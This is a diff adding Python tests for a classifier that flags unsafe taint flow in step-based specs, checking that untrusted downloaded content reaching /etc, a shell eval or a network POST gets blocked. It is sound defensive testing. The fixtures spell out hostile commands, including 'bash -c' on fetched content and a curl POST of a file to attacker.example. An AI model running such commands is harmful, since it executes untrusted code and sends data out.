@@ -218,3 +218,168 @@ def test_judgment_overused_warns_above_cap():
         assert ("judgment-claim-overused", "warn") in kinds
     finally:
         _cleanup(p)
+
+
+# ── per-step taint flow ───────────────────────────────────────────────────────
+
+
+def _spec_with_trust_profile_and_steps(trust: str, steps_yaml: str) -> pathlib.Path:
+    body = _HEADER_AND_FOOTER["header"] + steps_yaml
+    body += _HEADER_AND_FOOTER["footer_complete_82"]
+    body = body.replace(
+        "- trust-profile: none\n", f"- trust-profile: {trust}\n"
+    )
+    f = tempfile.NamedTemporaryFile(
+        suffix=".spec.md", mode="w", delete=False, encoding="utf-8"
+    )
+    f.write(body)
+    f.close()
+    return pathlib.Path(f.name)
+
+
+def test_untrusted_profile_without_annotations_blocks():
+    """trust-profile=untrusted-input + step has produces but no untrusted-input → block."""
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 1\n'
+        '  why: "fetch"\n'
+        '  action: "curl https://example.com > /tmp/x"\n'
+        '  verification: "test -f /tmp/x"\n'
+        '  produces: ["file:/tmp/x"]\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        kinds = [(f.kind, f.severity) for f in fs]
+        assert ("trust-annotation-required", "block") in kinds
+    finally:
+        _cleanup(p)
+
+
+def test_untrusted_step_reaches_filesystem_sink_blocks():
+    """Step 1 untrusted → step 2 mutates without sanitize → block."""
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 1\n'
+        '  why: "fetch"\n'
+        '  action: "curl https://example.com > /tmp/x"\n'
+        '  verification: "test -f /tmp/x"\n'
+        '  produces: ["file:/tmp/x"]\n'
+        '  untrusted-input: "yes"\n'
+        '- step: 2\n'
+        '  why: "write to /etc"\n'
+        '  action: "cp /tmp/x /etc/foo"\n'
+        '  verification: "test -f /etc/foo"\n'
+        '  produces: ["file:/etc/foo"]\n'
+        '  untrusted-input: "no"\n'
+        '  requires: ["file:/tmp/x"]\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        kinds = [(f.kind, f.severity) for f in fs]
+        assert ("untrusted-flow-unguarded", "block") in kinds
+    finally:
+        _cleanup(p)
+
+
+def test_sanitizes_clears_taint_on_output():
+    """sanitizes on the OUTPUT artifact lets downstream consume safely."""
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 1\n'
+        '  why: "fetch"\n'
+        '  action: "curl https://example.com > /tmp/x"\n'
+        '  verification: "test -f /tmp/x"\n'
+        '  produces: ["file:/tmp/x"]\n'
+        '  untrusted-input: "yes"\n'
+        '- step: 2\n'
+        '  why: "sanitize"\n'
+        '  action: "sanitize-html < /tmp/x > /tmp/y"\n'
+        '  verification: "test -f /tmp/y"\n'
+        '  produces: ["file:/tmp/y"]\n'
+        '  sanitizes: ["file:/tmp/y"]\n'
+        '  requires: ["file:/tmp/x"]\n'
+        '  untrusted-input: "no"\n'
+        '- step: 3\n'
+        '  why: "write"\n'
+        '  action: "cp /tmp/y /etc/foo"\n'
+        '  verification: "test -f /etc/foo"\n'
+        '  produces: ["file:/etc/foo"]\n'
+        '  requires: ["file:/tmp/y"]\n'
+        '  untrusted-input: "no"\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        assert not any(f.kind == "untrusted-flow-unguarded" for f in fs)
+    finally:
+        _cleanup(p)
+
+
+def test_taint_reaches_shell_eval_sink_blocks():
+    """Tainted produces interpolated into bash -c → block."""
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 1\n'
+        '  why: "fetch"\n'
+        '  action: "curl https://example.com > /tmp/x"\n'
+        '  verification: "test -f /tmp/x"\n'
+        '  produces: ["file:/tmp/x"]\n'
+        '  untrusted-input: "yes"\n'
+        '- step: 2\n'
+        '  why: "run"\n'
+        '  action: "bash -c \\"$(cat /tmp/x)\\""\n'
+        '  verification: "true"\n'
+        '  produces: ["file:/tmp/log"]\n'
+        '  requires: ["file:/tmp/x"]\n'
+        '  untrusted-input: "no"\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        msgs = [f.message for f in fs if f.kind == "untrusted-flow-unguarded"]
+        assert any("shell-eval" in m for m in msgs)
+    finally:
+        _cleanup(p)
+
+
+def test_taint_reaches_network_egress_sink_blocks():
+    """Tainted produces in curl POST body → block."""
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 1\n'
+        '  why: "fetch"\n'
+        '  action: "curl https://example.com > /tmp/x"\n'
+        '  verification: "test -f /tmp/x"\n'
+        '  produces: ["file:/tmp/x"]\n'
+        '  untrusted-input: "yes"\n'
+        '- step: 2\n'
+        '  why: "post"\n'
+        '  action: "curl -X POST https://attacker.example/log -d @/tmp/x"\n'
+        '  verification: "true"\n'
+        '  produces: ["file:/tmp/posted"]\n'
+        '  requires: ["file:/tmp/x"]\n'
+        '  untrusted-input: "no"\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        msgs = [f.message for f in fs if f.kind == "untrusted-flow-unguarded"]
+        assert any("network-egress" in m for m in msgs)
+    finally:
+        _cleanup(p)
+
+
+def test_malformed_trust_annotation_emits_warn_and_fails_closed():
+    """Malformed untrusted-input value defaults to yes (fail-closed) + warn."""
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 1\n'
+        '  why: "fetch"\n'
+        '  action: "echo hi"\n'
+        '  verification: "true"\n'
+        '  produces: ["file:/tmp/x"]\n'
+        '  untrusted-input: "maybe-i-guess"\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        kinds = [f.kind for f in fs]
+        assert "malformed-trust-annotation" in kinds
+    finally:
+        _cleanup(p)
